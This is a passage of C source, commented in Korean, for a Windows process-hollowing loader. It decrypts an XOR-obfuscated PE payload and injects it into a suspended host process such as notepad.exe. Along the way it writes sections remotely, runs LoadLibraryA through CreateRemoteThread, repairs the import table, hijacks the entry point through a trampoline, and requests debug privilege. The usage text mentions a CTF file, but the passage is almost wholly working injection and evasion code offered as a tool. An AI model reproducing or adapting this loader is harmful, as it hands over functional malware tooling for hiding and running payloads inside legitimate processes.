    *pRemoteProcedure = remoteProcedure;
    return TRUE;
}


static BOOL TranslateProcedureAddressToRemote(IN HANDLE hProcess,
    IN FARPROC localProcedure, OUT ULONG_PTR* pRemoteProcedure) {

    return TranslateProcedureAddressToRemoteEx(
        hProcess, localProcedure, pRemoteProcedure, TRUE);
}


static BOOL LoadLibraryIntoRemoteProcess(IN HANDLE hProcess,
    IN LPCSTR libraryName) {

    HMODULE kernel32 = GetModuleHandleA("kernel32.dll");
    FARPROC localLoadLibrary = kernel32
        ? GetProcAddress(kernel32, "LoadLibraryA")
        : NULL;
    ULONG_PTR remoteLoadLibrary = 0;
    PBYTE remoteName = NULL;
    HANDLE remoteThread = NULL;
    SIZE_T nameSize;
    SIZE_T written = 0;
    BOOL result = FALSE;

    /*
     * 원격 DLL 적재 함수 자체를 찾을 때는 다시 DLL 적재를 시도하지 않는다.
     * 그렇지 않으면 LoadLibraryA의 실제 소유 DLL이 없을 때 재귀가 생긴다.
     */
    if (!localLoadLibrary ||
        !TranslateProcedureAddressToRemoteEx(
            hProcess, localLoadLibrary, &remoteLoadLibrary, FALSE))
        return FALSE;

    nameSize = strlen(libraryName) + 1;
    remoteName = (PBYTE)VirtualAllocEx(
        hProcess, NULL, nameSize,
        MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
    if (!remoteName) {
        PRINT_WINAPI_ERR("VirtualAllocEx[remote-dll-name]");
        goto _CLEANUP;
    }

    if (!WriteProcessMemory(hProcess, remoteName, libraryName,
                            nameSize, &written) ||
        written != nameSize) {
        PRINT_WINAPI_ERR("WriteProcessMemory[remote-dll-name]");
        goto _CLEANUP;
    }

    remoteThread = CreateRemoteThread(
        hProcess, NULL, 0,
        (LPTHREAD_START_ROUTINE)remoteLoadLibrary,
        remoteName, 0, NULL);
    if (!remoteThread) {
        PRINT_WINAPI_ERR("CreateRemoteThread[LoadLibraryA]");
        goto _CLEANUP;
    }

    {
        DWORD wait = WaitForSingleObject(remoteThread, 10000);
        if (wait != WAIT_OBJECT_0) {
            if (wait == WAIT_FAILED)
                PRINT_WINAPI_ERR("WaitForSingleObject[LoadLibraryA]");
            else
                fprintf(stderr,
                        "[-] Remote LoadLibraryA timed out: %s\n",
                        libraryName);
            goto _CLEANUP;
        }

        DWORD threadResult = 0;
        if (!GetExitCodeThread(remoteThread, &threadResult) ||
            threadResult == 0) {
            fprintf(stderr,
                    "[-] Remote LoadLibraryA failed: %s\n",
                    libraryName);
            goto _CLEANUP;
        }
    }

    result = TRUE;

_CLEANUP:
    DELETE_HANDLE(remoteThread);
    if (remoteName)
        VirtualFreeEx(hProcess, remoteName, 0, MEM_RELEASE);
    return result;
}


static BOOL EnsureRemoteLibraryLoaded(IN HANDLE hProcess,
    IN LPCSTR libraryName) {

    DWORD processId = GetProcessId(hProcess);
    if (!processId)
        return FALSE;

    if (FindRemoteModuleBase(processId, libraryName))
        return TRUE;

    printf("[*] Remote loading missing import DLL: %s\n",
           libraryName);
    if (!LoadLibraryIntoRemoteProcess(hProcess, libraryName))
        return FALSE;

    return FindRemoteModuleBase(processId, libraryName) != NULL;
}


/* ---------------------------------------------------------------
 * 누락된 DLL을 remote LoadLibraryA로 적재한 뒤 원격 IAT 복구
 *
 * local GetProcAddress 결과에서 실제 소유 DLL과 RVA를 구한 뒤 대상의
 * 같은 DLL base에 더하므로 ASLR 차이와 forwarded export를 처리한다.
 * --------------------------------------------------------------- */
BOOL RepairRemoteIAT(IN HANDLE hProcess, IN PBYTE pPeBuffer,
    IN DWORD dwPeSize, IN PIMAGE_NT_HEADERS pImgNtHdrs,
    IN ULONG_PTR uRemoteBase) {

    IMAGE_DATA_DIRECTORY importDirectory =
        pImgNtHdrs->OptionalHeader.DataDirectory[
            IMAGE_DIRECTORY_ENTRY_IMPORT];

    if (!importDirectory.VirtualAddress || !importDirectory.Size) {
        printf("[*] No import directory\n");
        return TRUE;
    }

    DWORD descriptorCount =
        importDirectory.Size / sizeof(IMAGE_IMPORT_DESCRIPTOR);
    if (!descriptorCount || descriptorCount > 1024)
        return FALSE;

    for (DWORD descriptorIndex = 0;
         descriptorIndex < descriptorCount;
         descriptorIndex++) {

        DWORD descriptorRva = importDirectory.VirtualAddress +
            descriptorIndex * sizeof(IMAGE_IMPORT_DESCRIPTOR);
        PIMAGE_IMPORT_DESCRIPTOR descriptor =
            (PIMAGE_IMPORT_DESCRIPTOR)RawPointerFromRva(
                pPeBuffer, dwPeSize, pImgNtHdrs, descriptorRva,
                sizeof(IMAGE_IMPORT_DESCRIPTOR));
        if (!descriptor) {
            fprintf(stderr, "[-] Import descriptor is outside the file\n");
            return FALSE;
        }

        if (!descriptor->Name && !descriptor->FirstThunk)
            break;
        if (!descriptor->Name || !descriptor->FirstThunk)
            return FALSE;

        PBYTE libraryNameBytes = RawPointerFromRva(
            pPeBuffer, dwPeSize, pImgNtHdrs, descriptor->Name, 1);
        if (!libraryNameBytes)
            return FALSE;
        SIZE_T libraryNameLimit =
            dwPeSize - (SIZE_T)(libraryNameBytes - pPeBuffer);
        if (!memchr(libraryNameBytes, '\0', libraryNameLimit))
            return FALSE;

        LPCSTR libraryName = (LPCSTR)libraryNameBytes;
        HMODULE localModule = LoadLibraryA(libraryName);
        if (!localModule) {
            fprintf(stderr, "[-] LoadLibraryA failed for import: %s\n",
                    libraryName);
            return FALSE;
        }
        if (!EnsureRemoteLibraryLoaded(hProcess, libraryName)) {
            fprintf(stderr,
                    "[-] Unable to load import DLL in target: %s\n",
                    libraryName);
            return FALSE;
        }

        DWORD sourceThunkRva = descriptor->OriginalFirstThunk
            ? descriptor->OriginalFirstThunk
            : descriptor->FirstThunk;
        DWORD resolvedCount = 0;

        for (DWORD thunkIndex = 0; thunkIndex < 65536; thunkIndex++) {
            ULONGLONG thunkRva64 = (ULONGLONG)sourceThunkRva +
                (ULONGLONG)thunkIndex * sizeof(IMAGE_THUNK_DATA);
            ULONGLONG targetRva64 = (ULONGLONG)descriptor->FirstThunk +
                (ULONGLONG)thunkIndex * sizeof(IMAGE_THUNK_DATA);
            if (thunkRva64 > MAXDWORD ||
                targetRva64 + sizeof(ULONG_PTR) >
                    pImgNtHdrs->OptionalHeader.SizeOfImage) {
                fprintf(stderr, "[-] Import thunk range is invalid\n");
                return FALSE;
            }

            PIMAGE_THUNK_DATA thunk =
                (PIMAGE_THUNK_DATA)RawPointerFromRva(
                    pPeBuffer, dwPeSize, pImgNtHdrs,
                    (DWORD)thunkRva64, sizeof(IMAGE_THUNK_DATA));
            if (!thunk) {
                fprintf(stderr, "[-] Import thunk is outside the file\n");
                return FALSE;
            }
            if (!thunk->u1.AddressOfData)
                break;

            FARPROC functionAddress = NULL;
            if (IMAGE_SNAP_BY_ORDINAL(thunk->u1.Ordinal)) {
                functionAddress = GetProcAddress(
                    localModule,
                    MAKEINTRESOURCEA(
                        IMAGE_ORDINAL(thunk->u1.Ordinal)));
            } else {
                if (thunk->u1.AddressOfData > MAXDWORD)
                    return FALSE;
                PIMAGE_IMPORT_BY_NAME importByName =
                    (PIMAGE_IMPORT_BY_NAME)RawPointerFromRva(
                        pPeBuffer, dwPeSize, pImgNtHdrs,
                        (DWORD)thunk->u1.AddressOfData,
                        sizeof(WORD) + 1);
                if (!importByName)
                    return FALSE;

                PBYTE functionName = (PBYTE)importByName->Name;
                SIZE_T functionNameLimit =
                    dwPeSize - (SIZE_T)(functionName - pPeBuffer);
                if (!memchr(functionName, '\0', functionNameLimit))
                    return FALSE;
                functionAddress = GetProcAddress(
                    localModule, (LPCSTR)functionName);
            }

            if (!functionAddress) {
                fprintf(stderr, "[-] GetProcAddress failed in %s\n",
                        libraryName);
                return FALSE;
            }

            ULONG_PTR remoteFunction = 0;
            if (!TranslateProcedureAddressToRemote(
                    hProcess, functionAddress, &remoteFunction)) {
                fprintf(stderr,
                        "[-] Import address translation failed: %p from %s\n",
                        functionAddress, libraryName);
                return FALSE;
            }

            SIZE_T written = 0;
            PVOID remoteThunk = (PVOID)(
                uRemoteBase + (ULONG_PTR)targetRva64);
            if (!WriteProcessMemory(hProcess, remoteThunk,
                                    &remoteFunction,
                                    sizeof(remoteFunction), &written) ||
                written != sizeof(remoteFunction)) {
                PRINT_WINAPI_ERR("WriteProcessMemory[IAT]");
                return FALSE;
            }
            resolvedCount++;
        }

        printf("[*] IAT %-20s : %lu imports resolved\n",
               libraryName, resolvedCount);
    }

    printf("[*] Remote IAT repair complete\n");
    return TRUE;
}


/* ---------------------------------------------------------------
 * Windows loader가 원래 entry point까지 도달했는지 기다린다.
 * 이 시점에는 대상의 system DLL mapping이 완료되어 IAT 복구가 가능하다.
 * --------------------------------------------------------------- */
static BOOL WaitForRemoteEntryGate(IN HANDLE hProcess,
    IN HANDLE hStdOutRead, IN PBYTE pRemoteGateState,
    IN DWORD dwGateTimeoutMs) {

    ULONGLONG started = GetTickCount64();

    for (;;) {
        BYTE reached = 0;
        SIZE_T read = 0;
        if (!ReadProcessMemory(hProcess, pRemoteGateState,
                               &reached, sizeof(reached), &read) ||
            read != sizeof(reached)) {
            PRINT_WINAPI_ERR("ReadProcessMemory[entry-gate]");
            return FALSE;
        }
        if (reached == 1) {
            printf("[*] Windows loader initialization complete\n");
            return TRUE;
        }

        DWORD wait = WaitForSingleObject(hProcess, 0);
        if (wait == WAIT_OBJECT_0) {
            DWORD exitCode = 0;
            GetExitCodeProcess(hProcess, &exitCode);
            fprintf(stderr,
                    "[-] Target exited before entry gate: 0x%08lX\n",
                    exitCode);
            return FALSE;
        }
        if (wait == WAIT_FAILED) {
            PRINT_WINAPI_ERR("WaitForSingleObject[entry-gate]");
            return FALSE;
        }

        PrintOutput(hStdOutRead);
        if (GetTickCount64() - started >= dwGateTimeoutMs) {
            fprintf(stderr,
                    "[-] Timed out waiting for Windows loader initialization\n");
            SetLastError(ERROR_TIMEOUT);
            return FALSE;
        }
        Sleep(10);
    }
}


static BOOL ReleaseRemoteEntryGate(IN HANDLE hProcess,
    IN PBYTE pRemoteGateState) {

    BYTE release = 1;
    SIZE_T written = 0;
    if (!WriteProcessMemory(hProcess, pRemoteGateState + 1,
                            &release, sizeof(release), &written) ||
        written != sizeof(release)) {
        PRINT_WINAPI_ERR("WriteProcessMemory[release-entry-gate]");
        return FALSE;
    }
    printf("[*] Payload entry gate released\n");
    return TRUE;
}


/* ---------------------------------------------------------------
 * Apply correct section protections in remote process
 * --------------------------------------------------------------- */
BOOL FixMemPermissionsEx(IN HANDLE hProcess, IN ULONG_PTR pPeBaseAddress,
    IN PIMAGE_NT_HEADERS pImgNtHdrs, IN PIMAGE_SECTION_HEADER pImgSecHdr) {

    for (DWORD i = 0; i < pImgNtHdrs->FileHeader.NumberOfSections; i++) {
        DWORD dwProtection    = PAGE_NOACCESS;
        DWORD dwOldProtection = 0;
        DWORD characteristics = pImgSecHdr[i].Characteristics;

        if (!pImgSecHdr[i].SizeOfRawData || !pImgSecHdr[i].VirtualAddress)
            continue;

        if      ((characteristics & IMAGE_SCN_MEM_EXECUTE) &&
                 (characteristics & IMAGE_SCN_MEM_READ)    &&
                 (characteristics & IMAGE_SCN_MEM_WRITE))    dwProtection = PAGE_EXECUTE_READWRITE;
        else if ((characteristics & IMAGE_SCN_MEM_EXECUTE) &&
                 (characteristics & IMAGE_SCN_MEM_READ))     dwProtection = PAGE_EXECUTE_READ;
        else if ((characteristics & IMAGE_SCN_MEM_EXECUTE) &&
                 (characteristics & IMAGE_SCN_MEM_WRITE))    dwProtection = PAGE_EXECUTE_WRITECOPY;
        else if  (characteristics & IMAGE_SCN_MEM_EXECUTE)   dwProtection = PAGE_EXECUTE;
        else if ((characteristics & IMAGE_SCN_MEM_READ)    &&
                 (characteristics & IMAGE_SCN_MEM_WRITE))    dwProtection = PAGE_READWRITE;
        else if  (characteristics & IMAGE_SCN_MEM_READ)      dwProtection = PAGE_READONLY;
        else if  (characteristics & IMAGE_SCN_MEM_WRITE)     dwProtection = PAGE_WRITECOPY;

        if (!VirtualProtectEx(hProcess,
                              (PVOID)(pPeBaseAddress + pImgSecHdr[i].VirtualAddress),
                              pImgSecHdr[i].SizeOfRawData,
                              dwProtection, &dwOldProtection)) {
            PRINT_WINAPI_ERR("VirtualProtectEx");
            return FALSE;
        }
    }
    printf("[*] Section permissions applied\n");
    return TRUE;
}


/* ---------------------------------------------------------------
 * Drain stdout pipe from child process (non-blocking)
 * --------------------------------------------------------------- */
VOID PrintOutput(IN HANDLE StdOutRead) {
    for (;;) {
        DWORD dwAvailableBytes = 0;
        DWORD dwRead           = 0;
        PBYTE pBuffer          = NULL;

        if (!PeekNamedPipe(StdOutRead, NULL, 0, NULL, &dwAvailableBytes, NULL))
            break;
        if (dwAvailableBytes == 0)
            break;

        pBuffer = (PBYTE)LocalAlloc(LPTR, (SIZE_T)dwAvailableBytes + 1);
        if (!pBuffer) break;

        if (!ReadFile(StdOutRead, pBuffer, dwAvailableBytes, &dwRead, NULL)) {
            LocalFree(pBuffer);
            break;
        }

        fwrite(pBuffer, 1, dwRead, stdout);
        LocalFree(pBuffer);
    }
}


/* ---------------------------------------------------------------
 * 부모 stdin -> 자식 stdin pipe 전달
 *
 * stdout/stderr 수집과 분리된 전용 스레드에서 동작한다. 부모 stdin이
 * console이면 사용자가 Enter로 입력한 바이트를 전달하고, redirected
 * pipe/file이면 들어오는 바이트를 그대로 전달한다. 부모 stdin EOF
 * 또는 write 실패 시 자식 stdin write end를 닫아 EOF를 알린다.
 * --------------------------------------------------------------- */
typedef struct _STDIN_FORWARD_CONTEXT {
    HANDLE ParentStdIn;
    HANDLE ChildStdInWrite;
} STDIN_FORWARD_CONTEXT;

static DWORD WINAPI StandardInputForwardThread(IN LPVOID parameter) {
    STDIN_FORWARD_CONTEXT* context =
        (STDIN_FORWARD_CONTEXT*)parameter;
    HANDLE parentStdIn = context->ParentStdIn;
    HANDLE childStdInWrite = context->ChildStdInWrite;
    BYTE buffer[4096];

    HeapFree(GetProcessHeap(), 0, context);

    for (;;) {
        DWORD bytesRead = 0;
        if (!ReadFile(parentStdIn, buffer, sizeof(buffer),
                      &bytesRead, NULL) || bytesRead == 0)
            break;

        DWORD totalWritten = 0;
        while (totalWritten < bytesRead) {
            DWORD bytesWritten = 0;
            if (!WriteFile(childStdInWrite,
                           buffer + totalWritten,
                           bytesRead - totalWritten,
                           &bytesWritten, NULL) ||
                bytesWritten == 0) {
                totalWritten = bytesRead;
                goto _DONE;
            }
            totalWritten += bytesWritten;
        }
    }

_DONE:
    DELETE_HANDLE(childStdInWrite);
    return 0;
}


BOOL StartStandardInputForwarder(IN OUT HANDLE* pChildStdInWrite,
    OUT HANDLE* pForwardThread) {

    if (!pChildStdInWrite || !*pChildStdInWrite || !pForwardThread)
        return FALSE;
    *pForwardThread = NULL;

    HANDLE parentStdIn = GetStdHandle(STD_INPUT_HANDLE);
    if (!parentStdIn || parentStdIn == INVALID_HANDLE_VALUE) {
        printf("[*] Parent stdin unavailable; child stdin will receive EOF\n");
        DELETE_HANDLE(*pChildStdInWrite);
        return TRUE;
    }

    STDIN_FORWARD_CONTEXT* context =
        (STDIN_FORWARD_CONTEXT*)HeapAlloc(
            GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(*context));
    if (!context) {
        PRINT_WINAPI_ERR("HeapAlloc[stdin-forward]");
        return FALSE;
    }

    context->ParentStdIn = parentStdIn;
    context->ChildStdInWrite = *pChildStdInWrite;

    HANDLE thread = CreateThread(NULL, 0, StandardInputForwardThread,
                                 context, 0, NULL);
    if (!thread) {
        PRINT_WINAPI_ERR("CreateThread[stdin-forward]");
        HeapFree(GetProcessHeap(), 0, context);
        return FALSE;
    }

    // ChildStdInWrite 소유권을 worker에게 넘긴다.
    *pChildStdInWrite = NULL;
    *pForwardThread = thread;
    printf("[*] Interactive stdin forwarding started\n");
    return TRUE;
}


/* ---------------------------------------------------------------
 * Full process hollowing flow
 * --------------------------------------------------------------- */
BOOL RemotePeExec(IN PBYTE pPeBuffer, IN LPCSTR cRemoteProcessImage,
    IN DWORD dwPeSize, IN OPTIONAL LPCSTR cProcessParms,
    IN DWORD dwTimeoutMs) {
    PROCESS_INFORMATION   ProcessInfo          = { 0 };
    CONTEXT               Context              = { 0 };
    HANDLE                StdInWrite           = NULL;
    HANDLE                StdInForwardThread   = NULL;
    HANDLE                StdOutRead           = NULL;
    PBYTE                 pRemoteAddress       = NULL;
    PBYTE                 pRemoteGateState     = NULL;
    ULONG_PTR             uOriginalEntryPoint  = 0;
    ULONG_PTR             uPebImageBaseField   = 0;
    ULONG_PTR             uPayloadEntryPoint   = 0;
    PIMAGE_NT_HEADERS     pImgNtHdrs           = NULL;
    PIMAGE_SECTION_HEADER pImgSecHdr           = NULL;
    SIZE_T                NumberOfBytesWritten = 0;
    BOOL                  bThreadResumed       = FALSE;
    BOOL                  bSTATE               = FALSE;

    if (!pPeBuffer || !cRemoteProcessImage ||
        dwPeSize < sizeof(IMAGE_DOS_HEADER))
        return FALSE;

    printf("[*] Entering RemotePeExec\n");

    Context.ContextFlags = CONTEXT_ALL;

    if (!CreateTheHollowedProcess(cRemoteProcessImage, cProcessParms,
                                  &ProcessInfo, &StdInWrite, &StdOutRead))
        goto _CLEANUP;

    printf("[*] Hollow process created\n");

    {
        LONG ntOffset = ((PIMAGE_DOS_HEADER)pPeBuffer)->e_lfanew;
        if (ntOffset <= 0 || (SIZE_T)ntOffset + sizeof(IMAGE_NT_HEADERS) >
            dwPeSize) {
            fprintf(stderr, "[!] Invalid NT header offset\n");
            goto _CLEANUP;
        }
        pImgNtHdrs = (PIMAGE_NT_HEADERS)(
            (ULONG_PTR)pPeBuffer + (SIZE_T)ntOffset);
    }

    if (pImgNtHdrs->Signature != IMAGE_NT_SIGNATURE) {
        fprintf(stderr, "[!] Invalid NT Image Headers\n");
        goto _CLEANUP;
    }
    if (pImgNtHdrs->FileHeader.Machine != IMAGE_FILE_MACHINE_AMD64 ||
        pImgNtHdrs->OptionalHeader.Magic != IMAGE_NT_OPTIONAL_HDR64_MAGIC ||
        pImgNtHdrs->FileHeader.SizeOfOptionalHeader <
            sizeof(IMAGE_OPTIONAL_HEADER64)) {
        fprintf(stderr, "[-] Native hollowing path requires an x64 PE\n");
        goto _CLEANUP;
    }
    if (!pImgNtHdrs->FileHeader.NumberOfSections ||
        pImgNtHdrs->FileHeader.NumberOfSections > 96) {
        fprintf(stderr, "[-] Invalid section count\n");
        goto _CLEANUP;
    }
    {
        SIZE_T sectionTableOffset =
            (SIZE_T)((PBYTE)IMAGE_FIRST_SECTION(pImgNtHdrs) - pPeBuffer);
        SIZE_T sectionTableSize =
            (SIZE_T)pImgNtHdrs->FileHeader.NumberOfSections *
            sizeof(IMAGE_SECTION_HEADER);
        if (sectionTableOffset > dwPeSize ||
            sectionTableSize > dwPeSize - sectionTableOffset ||
            !pImgNtHdrs->OptionalHeader.SizeOfHeaders ||
            pImgNtHdrs->OptionalHeader.SizeOfHeaders > dwPeSize ||
            pImgNtHdrs->OptionalHeader.SizeOfHeaders >
                pImgNtHdrs->OptionalHeader.SizeOfImage) {
            fprintf(stderr, "[-] Invalid PE header/section bounds\n");
            goto _CLEANUP;
        }
    }

    printf("[*] ImageBase: 0x%p  SizeOfImage: 0x%lX\n",
           (PVOID)(ULONG_PTR)pImgNtHdrs->OptionalHeader.ImageBase,
           pImgNtHdrs->OptionalHeader.SizeOfImage);

    pRemoteAddress = (PBYTE)VirtualAllocEx(
        ProcessInfo.hProcess,
        (LPVOID)(ULONG_PTR)pImgNtHdrs->OptionalHeader.ImageBase,
        (SIZE_T)pImgNtHdrs->OptionalHeader.SizeOfImage,
        MEM_RESERVE | MEM_COMMIT,
        PAGE_READWRITE);

    if (!pRemoteAddress) {
        PRINT_WINAPI_ERR("VirtualAllocEx");
        goto _CLEANUP;
    }

    printf("[*] Remote alloc at: 0x%p\n", pRemoteAddress);

    if ((ULONG_PTR)pRemoteAddress != (ULONG_PTR)pImgNtHdrs->OptionalHeader.ImageBase) {
        fprintf(stderr, "[!] PE Payload Will Require Relocation - [NOT SUPPORTED]\n");
        fprintf(stderr, "[!] Wanted: 0x%p  Got: 0x%p\n",
                (PVOID)(ULONG_PTR)pImgNtHdrs->OptionalHeader.ImageBase,
                pRemoteAddress);
        goto _CLEANUP;
    }

    if (!WriteProcessMemory(ProcessInfo.hProcess, pRemoteAddress, pPeBuffer,
                            pImgNtHdrs->OptionalHeader.SizeOfHeaders,
                            &NumberOfBytesWritten) ||
        NumberOfBytesWritten != pImgNtHdrs->OptionalHeader.SizeOfHeaders) {
        PRINT_WINAPI_ERR("WriteProcessMemory[headers]");
        goto _CLEANUP;
    }

    printf("[*] PE headers written\n");

    pImgSecHdr = IMAGE_FIRST_SECTION(pImgNtHdrs);

    for (WORD i = 0; i < pImgNtHdrs->FileHeader.NumberOfSections; i++) {
        if (pImgSecHdr[i].SizeOfRawData == 0)
            continue;

        if ((ULONGLONG)pImgSecHdr[i].PointerToRawData +
                pImgSecHdr[i].SizeOfRawData > dwPeSize ||
            (ULONGLONG)pImgSecHdr[i].VirtualAddress +
                pImgSecHdr[i].SizeOfRawData >
                    pImgNtHdrs->OptionalHeader.SizeOfImage) {
            fprintf(stderr, "[-] Section %u is outside PE bounds\n", i);
            goto _CLEANUP;
        }

        NumberOfBytesWritten = 0;
        if (!WriteProcessMemory(ProcessInfo.hProcess,
                                pRemoteAddress + pImgSecHdr[i].VirtualAddress,
                                pPeBuffer      + pImgSecHdr[i].PointerToRawData,
                                pImgSecHdr[i].SizeOfRawData,
                                &NumberOfBytesWritten) ||
            NumberOfBytesWritten != pImgSecHdr[i].SizeOfRawData) {
            PRINT_WINAPI_ERR("WriteProcessMemory[section]");
            goto _CLEANUP;
        }

        printf("[*] Section [%d] written: VA=0x%08lX  size=0x%lX\n",
               i, pImgSecHdr[i].VirtualAddress, pImgSecHdr[i].SizeOfRawData);
    }

    if (!GetThreadContext(ProcessInfo.hThread, &Context)) {
        PRINT_WINAPI_ERR("GetThreadContext");
        goto _CLEANUP;
    }

    printf("[*] Thread context: RIP=0x%llX  RCX=0x%llX  RDX=0x%llX\n",
           Context.Rip, Context.Rcx, Context.Rdx);

    uOriginalEntryPoint = (ULONG_PTR)Context.Rcx;
    uPebImageBaseField = (ULONG_PTR)Context.Rdx +
        offsetof(PEB, Reserved3[1]);
    uPayloadEntryPoint = (ULONG_PTR)pRemoteAddress +
        pImgNtHdrs->OptionalHeader.AddressOfEntryPoint;

    if (!InstallEntryPointTrampoline(ProcessInfo.hProcess,
                                     uOriginalEntryPoint,
                                     uPebImageBaseField,
                                     (ULONG_PTR)pRemoteAddress,
                                     uPayloadEntryPoint,
                                     &pRemoteGateState))
        goto _CLEANUP;

    printf("[*] Resuming thread...\n");

    if (ResumeThread(ProcessInfo.hThread) == (DWORD)-1) {
        PRINT_WINAPI_ERR("ResumeThread");
        goto _CLEANUP;
    }
    bThreadResumed = TRUE;

    if (!WaitForRemoteEntryGate(ProcessInfo.hProcess, StdOutRead,
                                pRemoteGateState, 10000))
        goto _CLEANUP;

    if (!RepairRemoteIAT(ProcessInfo.hProcess, pPeBuffer, dwPeSize,
                         pImgNtHdrs, (ULONG_PTR)pRemoteAddress))
        goto _CLEANUP;

    if (!FixMemPermissionsEx(ProcessInfo.hProcess,
                             (ULONG_PTR)pRemoteAddress,
                             pImgNtHdrs, pImgSecHdr))
        goto _CLEANUP;

    if (!StartStandardInputForwarder(&StdInWrite,
                                     &StdInForwardThread))
        goto _CLEANUP;

    if (!ReleaseRemoteEntryGate(ProcessInfo.hProcess, pRemoteGateState))
        goto _CLEANUP;

    printf("[*] Reading output and waiting for process exit");
    if (dwTimeoutMs == INFINITE)
        printf(" (no timeout)...\n");
    else
        printf(" (timeout: %lu ms)...\n", dwTimeoutMs);

    {
        const DWORD dwPollInterval = 100;
        ULONGLONG ullStarted = GetTickCount64();
        DWORD dwWait = WAIT_TIMEOUT;
        DWORD dwExitCode = STILL_ACTIVE;

        for (;;) {
            PrintOutput(StdOutRead);

            dwWait = WaitForSingleObject(ProcessInfo.hProcess, dwPollInterval);
            if (dwWait == WAIT_OBJECT_0)
                break;
            if (dwWait == WAIT_FAILED) {
                PRINT_WINAPI_ERR("WaitForSingleObject");
                goto _CLEANUP;
            }

            if (dwTimeoutMs != INFINITE &&
                GetTickCount64() - ullStarted >= dwTimeoutMs) {
                fprintf(stderr,
                        "[!] Timeout after %lu ms - PID %lu is still running\n",
                        dwTimeoutMs, ProcessInfo.dwProcessId);
                SetLastError(ERROR_TIMEOUT);
                goto _CLEANUP;
            }
        }

        // 프로세스 종료 직후 pipe에 남은 출력까지 모두 비운다.
        PrintOutput(StdOutRead);

        if (!GetExitCodeProcess(ProcessInfo.hProcess, &dwExitCode)) {
            PRINT_WINAPI_ERR("GetExitCodeProcess");
            goto _CLEANUP;
        }

        printf("[*] Hollowed process exited with code: 0x%08lX (%lu)\n",
               dwExitCode, dwExitCode);

        // 일반적인 unhandled exception NTSTATUS는 성공으로 보고하지 않는다.
        if ((dwExitCode & 0xF0000000UL) == 0xC0000000UL) {
            fprintf(stderr,
                    "[-] Hollowed process terminated by exception: 0x%08lX\n",
                    dwExitCode);
            goto _CLEANUP;
        }
    }

    bSTATE = TRUE;

_CLEANUP:
    if (!bSTATE && bThreadResumed && ProcessInfo.hProcess) {
        DWORD exitCode = 0;
        if (GetExitCodeProcess(ProcessInfo.hProcess, &exitCode) &&
            exitCode == STILL_ACTIVE) {
            TerminateProcess(ProcessInfo.hProcess, ERROR_PROCESS_ABORTED);
            WaitForSingleObject(ProcessInfo.hProcess, 1000);
            printf("[*] Failed/timeout child process terminated\n");
        }
    }
    if (StdInForwardThread) {
        // console ReadFile 등에서 대기 중인 input worker를 깨운다.
        if (!CancelSynchronousIo(StdInForwardThread) &&
            GetLastError() != ERROR_NOT_FOUND) {
            PRINT_WINAPI_ERR("CancelSynchronousIo[stdin-forward]");
        }
        WaitForSingleObject(StdInForwardThread, 1000);
    }
    DELETE_HANDLE(StdInForwardThread);
    DELETE_HANDLE(StdInWrite);
    DELETE_HANDLE(StdOutRead);
    DELETE_HANDLE(ProcessInfo.hThread);
    DELETE_HANDLE(ProcessInfo.hProcess);
    return bSTATE;
}


/* ---------------------------------------------------------------
 * main - argv[1]: 페이로드 경로
 *        argv[2]: 네이티브 PE용 대상 프로세스 경로
 * --------------------------------------------------------------- */
int main(int argc, char* argv[]) {
    PBYTE  pBuffer        = NULL;
    DWORD  dwBufferSize   = 0;
    BOOL   bResult        = FALSE;
    DWORD  dwNativeTimeoutMs = INFINITE;
    LPCSTR pPayloadPath   = NULL;
    LPCSTR pTargetProcess = NULL;

    setvbuf(stdout, NULL, _IONBF, 0);

    if (argc < 2) {
        fprintf(stderr, "Usage:   %s <encrypted_payload> [target_process]\n", argv[0]);
        fprintf(stderr, "Native:  %s ctf.bin C:\\Windows\\System32\\notepad.exe [timeout_ms]\n", argv[0]);
        fprintf(stderr, "Managed: %s managed.bin\n", argv[0]);
        return -1;
    }

    pPayloadPath   = argv[1];
    pTargetProcess = (argc >= 3) ? argv[2] : NULL;

    if (argc >= 4) {
        CHAR* end = NULL;
        unsigned long parsed = strtoul(argv[3], &end, 10);
        if (!end || *end != '\0') {
            fprintf(stderr, "[-] Invalid timeout_ms: %s\n", argv[3]);
            return -1;
        }
        dwNativeTimeoutMs = parsed == 0 ? INFINITE : (DWORD)parsed;
    }

    printf("[*] Payload : %s\n", pPayloadPath);
    printf("[*] Target  : %s\n", pTargetProcess ? pTargetProcess : "(not supplied)");

    /* 1. 암호화된 페이로드 읽기 */
    if (!ReadFileFromDisk(pPayloadPath, &pBuffer, &dwBufferSize)) {
        fprintf(stderr, "[!] Failed to read payload: %s\n", pPayloadPath);
        return -1;
    }
    printf("[*] Payload read: %lu bytes\n", dwBufferSize);

    /* 2. XOR 0x55 복호화 */
    DecryptBuffer(pBuffer, dwBufferSize);

    /* 3. MZ 헤더 검증 */
    if (dwBufferSize < 2 || pBuffer[0] != 'M' || pBuffer[1] != 'Z') {
        fprintf(stderr, "[!] Decrypted buffer is not a valid PE (bad MZ)\n");
        HeapFree(GetProcessHeap(), 0, pBuffer);
        return -1;
    }
    printf("[*] MZ header verified\n");

    /* 4. 관리형/네이티브 실행 경로 분기 */
    if (IsManagedPE(pBuffer, dwBufferSize)) {
        bResult = RunManagedAssembly(pBuffer, dwBufferSize);
    } else {
        if (!pTargetProcess) {
            fprintf(stderr, "[-] Native PE requires a target_process argument\n");
            bResult = FALSE;
            goto _CLEANUP;
        }

        if (!EnableDebugPrivilege()) {
            fprintf(stderr,
                    "[!] SeDebugPrivilege unavailable; continuing with the handle returned by CreateProcess\n");
        }

        printf("[*] Native PE detected - starting process hollowing\n");
        bResult = RemotePeExec(pBuffer, pTargetProcess, dwBufferSize, PARMS,
                               dwNativeTimeoutMs);
    }
